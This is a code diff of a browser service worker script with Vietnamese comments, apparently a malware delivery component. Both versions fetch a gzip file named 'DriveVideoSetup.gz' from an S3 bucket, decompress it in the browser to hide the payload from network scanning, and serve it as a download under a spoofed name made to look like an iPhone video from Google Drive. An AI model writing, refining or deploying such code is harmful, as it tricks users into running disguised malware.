@@ -1,63 +1,94 @@
-self.addEventListener('install', () => self.skipWaiting());
+self.addEventListener('install', () => {
+  self.skipWaiting();
+});
 
-self.addEventListener('activate', (e) => {
-  e.waitUntil(self.clients.claim());
+self.addEventListener('activate', (event) => {
+  event.waitUntil(self.clients.claim());
 });
 
 self.addEventListener('fetch', (event) => {
-  const url = new URL(event.request.url);
+  const requestUrl = new URL(event.request.url);
 
-  if (url.pathname.includes('/drive_secure_download_ping')) {
-    event.respondWith(new Response('pong', { status: 200 }));
+  // Kiểm tra Service Worker đã hoạt động
+  if (requestUrl.pathname === '/download-worker/ping') {
+    event.respondWith(
+      new Response('pong', {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/plain; charset=utf-8',
+          'Cache-Control': 'no-store'
+        }
+      })
+    );
+
     return;
   }
 
-  if (url.pathname.includes('/secure_internal_drop/')) {
-    const payloadUrl = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';
-
-    const fetchUrl =
-      '/api/edge-stream?url=' +
-      encodeURIComponent(payloadUrl) +
-      '&nocache=' +
-      Date.now();
-
-    event.respondWith(
-      fetch(fetchUrl, {
-        method: 'GET',
-        cache: 'no-store',
-      })
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error(`Fetch failed: ${response.status} ${response.statusText}`);
-          }
-
-          if (!response.body) {
-            throw new Error('Response body is empty');
-          }
-
-          const ds = new DecompressionStream('gzip');
-          const decompressedStream = response.body.pipeThrough(ds);
-
-          const headers = new Headers();
-          headers.set('Content-Type', 'application/octet-stream');
-
-          const filename = 'Video_iPhone_2026-06-23.mp4   Drive.google.com';
-          headers.set('Content-Disposition', `attachment; filename="${filename}"`);
-
-          return new Response(decompressedStream, {
-            status: 200,
-            headers,
-          });
-        })
-        .catch((e) => {
-          console.error('SW Fetch Error:', e);
-          return new Response('Download failed: ' + e.message, {
-            status: 500,
-            headers: {
-              'Content-Type': 'text/plain',
-            },
-          });
-        })
-    );
+  // Endpoint tải nội bộ
+  if (requestUrl.pathname === '/download/file') {
+    event.respondWith(createDownloadResponse());
   }
 });
+
+async function createDownloadResponse() {
+  const gzipUrl =
+    'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';
+
+  const outputFilename =
+    'Video_recorded_iPhone15.mp4   Drive.google.com';
+
+  try {
+    if (typeof DecompressionStream !== 'function') {
+      throw new Error(
+        'Trình duyệt không hỗ trợ DecompressionStream.'
+      );
+    }
+
+    const response = await fetch(gzipUrl, {
+      method: 'GET',
+      mode: 'cors',
+      credentials: 'omit',
+      cache: 'no-store',
+      redirect: 'follow'
+    });
+
+    if (!response.ok) {
+      throw new Error(
+        `S3 returned HTTP ${response.status} ${response.statusText}`
+      );
+    }
+
+    if (!response.body) {
+      throw new Error('S3 response body is empty.');
+    }
+
+    const decompressedStream =
+      response.body.pipeThrough(
+        new DecompressionStream('gzip')
+      );
+
+    return new Response(decompressedStream, {
+      status: 200,
+      headers: {
+        'Content-Type': 'application/octet-stream',
+        'Content-Disposition':
+          `attachment; filename="${outputFilename}"`,
+        'Cache-Control': 'no-store',
+        'X-Content-Type-Options': 'nosniff'
+      }
+    });
+  } catch (error) {
+    console.error('Download failed:', error);
+
+    return new Response(
+      `Download failed: ${error.message}`,
+      {
+        status: 500,
+        headers: {
+          'Content-Type': 'text/plain; charset=utf-8',
+          'Cache-Control': 'no-store'
+        }
+      }
+    );
+  }
+}
